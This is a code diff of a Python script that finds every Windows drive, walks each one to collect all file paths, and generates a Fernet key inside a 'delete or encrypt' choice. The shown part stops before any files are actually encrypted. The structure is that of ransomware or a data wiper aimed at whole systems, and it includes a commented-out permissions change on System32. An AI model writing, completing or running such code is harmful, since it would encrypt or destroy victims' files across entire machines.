@@ -2,11 +2,11 @@ import os
 import subprocess
 import platform
 from cryptography.fernet import Fernet
-import re
 from string import ascii_uppercase
 
-def get_available_windrives():
+def get_windrives_filenames():
     drives = []
+    files = []
     for drive in ascii_uppercase:
         if os.path.exists(os.path.join(str(drive) + ":\\")):
             drives.append(str(drive) + ":\\")
@@ -19,8 +19,12 @@ def get_available_windrives():
             drives.append(progf86_path)
             drives.append(progf_path)
             drives.pop(i)
+    for drive in drives:
+        for root, _, filenames in os.walk(drive):
+            for filename in filenames:
+                files.append(os.path.join(root, filename))
     
-    return drives
+    return [drives, files]
 
 
 if(platform.system() == 'Windows'):
@@ -37,15 +41,20 @@ if(platform.system() == 'Windows'):
         # subprocess.run(['cacls', sys32_path])
         # print('Done')
 
-
-    if(delenc_choice == 'enc'):
+    elif(delenc_choice == 'enc'):
         print('Starting Encryption process...')
 
         key = Fernet.generate_key()
         keyfunc = Fernet(key)
 
-        drives_list = get_available_windrives()
-        print(drives_list)
+        drives_list, filenames = get_windrives_filenames()
+
+        print('Initiating encryption on ' + str(drives_list) + '...')
+
+
+
+    else:
+        print('Invalid input. Exiting.')
 
 
         
